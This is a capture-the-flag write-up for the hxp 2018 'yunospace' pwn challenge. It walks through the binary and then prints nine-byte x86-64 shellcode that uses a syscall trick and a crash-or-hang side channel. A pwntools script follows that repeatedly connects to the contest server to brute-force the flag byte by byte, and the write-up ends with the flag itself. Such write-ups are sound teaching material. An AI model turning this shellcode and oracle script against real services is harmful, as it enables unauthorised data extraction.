# yunospace hxp2018
> December 8 | pwn | 150 + bonus points | by kirschju

> Writeup author: big_J

### Overview
We are given a wrapper.py file, and a yunospace executable. When the wrapper is run, it asks for an index of the flag, then send that single byte to the yunospace binary in as an argument, then it asks for shellcode. If we take a look in at the binary, it looks like there is a lot going on:

![](https://gitlab.com/b1g_J/yunospace/raw/master/img/ida.png)

There is really two things going on here. First it makes sure the argument is actually one byte. Then it makes two pages. When we are prompted for shellcode it reads nine bytes, which writes it into one of the pages then it sets the space before our shellcode with the opcodes for `xor eax, eax` and it sets the byte right after our shellcode to the byte from the flag. So this page this we wrote into is bassically:

```
xor eax, eax
<our 9 bytes of shellcode>
<the byte from the flag>
```

After this, it does some operations that Ida was not able to understand. It clears all the registers except rip and rsi, sets rsp to the empty page, then jumps to the page with our shellcode. This is the state when we jump to the page:

![](https://gitlab.com/b1g_J/yunospace/raw/master/img/gdb.png)

So we have nine bytes of shellcode to figure out what the byte after our shellcode is. There are two ways of doing this. We could try to write that byte to stdout, or we could try to guess what it is and have the program crash if our guess is wrong. I went with the latter.

### Solution

So we have nine bytes of shellcode, the address of the page we are currently in in `rip`, and the empty page in `rsp`. The biggest problem to overcome is figuring out how to get the value of `rip` into another register in as few bytes as possible. A fun trick is to just do a syscall. We don't actually care what that syscall does, as long as the program does not crash. Syscalls usually shift the registers around a bit, and it only costs us two bytes. It just so happens that if we start our shellcode with a syscall, then the value `rip` gets copied into `rcx`. This only costs two bytes! Then we can use this value in `rcx` to compare our guessed byte value with the byte value from the flag. Then `jmp` back two if that is true. That will create an infinite loop if the character you guessed is correct, and will crash if our guess is wrong. With this we can slowly, but surely brute force out all the characters of the flag!

This was the shellcode I ended up using:

```
syscall                          # trick to get rip into rcx
cmp byte ptr [rcx + 7], <guess>; # compare the guessed char with flag char
jz $-2                           # infinite loop if last instruction true
```

and the solve:

```python
#!/usr/bin/python
from pwn import *
from string import printable

'''
syscall;
cmp byte ptr [rcx + 7], 0xff;
jz $-2;
'''

context.log_level='warn'
context.terminal='/usr/bin/zsh'

shellcode="\x0F\x05\x80\x79\x07{}\x74\xFE"


def check(char, index):
    p=remote('195.201.127.119', 8664)
    p.recvuntil('?')
    p.sendline(str(index))
    p.recvline()
    time.sleep(0.2)
    p.sendline(shellcode.format(char).ljust(9, ' '))
    time.sleep(0.4)
    if p.connected():
        p.close()
        return True
    p.close()
    return False


flag='hxp{'
for i in range(len(flag),58):
    for k in printable:
        if check(k, i):
            flag+=k
            print(flag)
            break
    else:
        print('ERROR')
        break


```

### Flag
hxp{y0u_w0uldnt_b3l13v3_h0w_m4ny_3mulat0rs_g0t_th1s_wr0ng}
